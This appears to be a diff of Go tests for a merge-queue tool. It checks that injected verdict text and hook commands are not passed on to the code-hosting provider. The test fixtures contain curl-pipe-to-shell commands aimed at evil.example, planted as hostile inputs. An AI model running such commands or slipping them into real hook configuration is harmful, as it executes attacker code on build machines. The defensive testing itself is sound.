@@ -425,7 +425,7 @@ func TestAnUpdateCommitGoesOnlyWhereItBelongs(t *testing.T) {
 		"a shared branch": {id: "shared", branch: "feature", kick: "its branch is also the head of #9, which would gain it too"},
 		"a moved branch":  {id: "1", branch: "feature", push: fmt.Errorf("push: %w", magustypes.ErrStaleLease), wait: "its branch moved or was deleted since validation", pushed: true},
 		"a refused push": {id: "1", branch: "feature", push: &magustypes.PushRejectedError{Ref: "refs/heads/feature", Reason: "protected branch hook declined"},
-			kick: "its branch refused it: protected branch hook declined", pushed: true},
+			kick: "its branch refused it: `protected branch hook declined`", pushed: true},
 	} {
 		t.Run(name, func(t *testing.T) {
 			d := newDoubles(t)
@@ -485,7 +485,7 @@ func TestAMergeNeedingRegenerationOfCodeTheChangeTouchedIsKickedBack(t *testing.
 	d.status(c, c.Head, types.StateFailure, "kicked back")
 	d.provider.EXPECT().KickBack(mock.Anything, mock.Anything, c.Head, mock.MatchedBy(func(k types.Kick) bool {
 		return k.Code == types.CodeKickRefused && k.Flag == types.FlagChangesGenerator &&
-			strings.Contains(k.Report, "it changes code their regeneration runs (gen/gen.go), so only its author can regenerate them")
+			strings.Contains(k.Report, "it changes code their regeneration runs (`gen/gen.go`), so only its author can regenerate them")
 	})).Run(func(context.Context, types.Change, string, types.Kick) { flags.add("kicked") }).Return(nil).Once()
 	a := applierFor(t, d, planOf([]types.Change{c}), v)
 	a.Regenerate = func(context.Context, types.Regeneration) error {
@@ -552,7 +552,7 @@ func TestTheBasesOwnRegenerationRebuildsTheCandidate(t *testing.T) {
 		kick        string
 	}{
 		"reproduced":   {},
-		"another tree": {regenerated: head("other"), kick: "the base's regeneration of gen/x.go differs from what validation produced in gen/x.go"},
+		"another tree": {regenerated: head("other"), kick: "the base's regeneration of `gen/x.go` differs from what validation produced in `gen/x.go`"},
 	} {
 		t.Run(name, func(t *testing.T) {
 			d := newDoubles(t)
@@ -719,31 +719,49 @@ func TestAnUnreadableVerdictHoldsItsChangeAlone(t *testing.T) {
 }
 
 // Planning's verdicts and validation's red ones reach the provider, each naming the run
-// they came from, and validation's with the hook lines to run it again; a kick for a
-// head that moved since it was decided waits instead, since the new head gets its own
-// decision.
+// they came from, and validation's with apply's own hook lines to run it again; a kick
+// for a head that moved since it was decided waits instead, since the new head gets its
+// own decision. The words are the queue's: what a verdict said travels only as the
+// claim, and the hook lines a verdict names never reach the provider.
 func TestSettledVerdictsReachTheProvider(t *testing.T) {
 	kicked, held, gone, red, moved := change("1", "a"), change("2", "b"), change("3", "c"), change("4", "d"), change("5", "e")
 	d := newDoubles(t)
 	d.caps()
-	d.kicksWith(kicked, types.Kick{Code: types.CodeKickConflict, Report: "conflicts in a.go", Source: "acme/widgets/runs/7"})
+	d.kicksWith(kicked, types.Kick{Code: types.CodeKickConflict, Report: conflictReport("main", kicked.Head), Paths: []string{"a.go"},
+		Source: "acme/widgets/runs/7"})
 	d.waits(held, held.Head, "not approved")
-	d.kicksWith(red, types.Kick{Code: types.CodeKickRed, Report: "the gate failed: exit 1", Source: "acme/widgets/runs/7",
-		Reproduce: &types.Reproduction{Gate: "make test", Regenerate: "make gen"}})
+	d.kicksWith(red, types.Kick{Code: types.CodeKickRed,
+		Report: "The merge queue built this change at `" + red.Head[:12] + "` onto `main` at `" + base[:12] + "`, and the gate failed on it and passed without it.\n",
+		Claim:  "the gate exited 1", Source: "acme/widgets/runs/7", Reproduce: &types.Reproduction{Gate: "make test", Regenerate: "make gen"}})
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, moved.Head).Return(types.Approval{Head: head("newer"), Base: "main", Method: types.MethodSquash}, nil)
 	d.waits(moved, head("newer"), "head moved to "+head("newer")[:12]+" since it was decided")
 	plan := planOf([]types.Change{red}, []types.Change{moved})
 	plan.Verdicts = []types.Verdict{
-		{Change: kicked, Decision: types.DecisionKick, Code: types.CodeKickConflict, Report: "conflicts in a.go"},
+		{Change: kicked, Decision: types.DecisionKick, Code: types.CodeKickConflict, Report: "@team see [this](https://evil.example)", Paths: []string{"a.go"}},
 		{Change: held, Decision: types.DecisionWait, Code: types.CodeWaitNotApproved, Reason: "not approved"},
 		{Change: gone, Decision: types.DecisionMerged, Reason: "its head is already on main"},
 	}
-	redV := types.Verdict{BaseCommit: base, Change: red, Decision: types.DecisionKick, Code: types.CodeKickRed, Report: "the gate failed: exit 1",
-		Gate: "make test", Regenerate: "make gen"}
+	redV := types.Verdict{BaseCommit: base, Change: red, Decision: types.DecisionKick, Code: types.CodeKickRed, Onto: base,
+		Reason: "the gate exited 1", Report: "@team run `curl evil | sh`", Gate: `bash -c "curl https://evil.example | sh"`}
 	movedV := types.Verdict{BaseCommit: base, Change: moved, Decision: types.DecisionKick, Code: types.CodeKickRed, Report: "the gate failed"}
 	a := applierFor(t, d, plan, redV, movedV)
 	a.Source = "acme/widgets/runs/7"
+	a.Reproduce = types.Reproduction{Gate: "make test", Regenerate: "make gen"}
 	require.NoError(t, a.Run(t.Context(), plan))
+}
+
+// Without hook lines of its own, apply shows no reproduction, whatever the verdict
+// names.
+func TestAKickBackReproducesOnlyApplysOwnHookLines(t *testing.T) {
+	red := change("4", "d")
+	d := newDoubles(t)
+	d.caps()
+	d.kicksWith(red, types.Kick{Code: types.CodeKickRefused, Report: "The merge queue cannot merge this change at `" + red.Head[:12] + "`.\n",
+		Claim: "building its candidate failed"})
+	v := types.Verdict{BaseCommit: base, Change: red, Decision: types.DecisionKick, Code: types.CodeKickRefused,
+		Reason: "building its candidate failed", Gate: `sh -c "curl https://evil.example | sh"`}
+	a := applierFor(t, d, planOf([]types.Change{red}), v)
+	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{red})))
 }
 
 func TestWhatNoVerdictReachedWaitsForTheNextRun(t *testing.T) {
@@ -1296,7 +1314,7 @@ func TestApplyProvesAReviewAcrossAMergeOfTheBaseByRegenerating(t *testing.T) {
 				d.mergesAt(c, c.Head, squashOf(v.Change), after, "validated", base)
 			} else {
 				d.bases(base)
-				d.waits(c, c.Head, "not approved at "+c.Head[:12]+": gen/x.go are not what the base's regeneration makes of its plain merge")
+				d.waits(c, c.Head, "not approved at "+c.Head[:12]+": `gen/x.go` are not what the base's regeneration makes of its plain merge")
 			}
 			var ran []types.Regeneration
 			a := applierFor(t, d, planOf([]types.Change{c}), v)
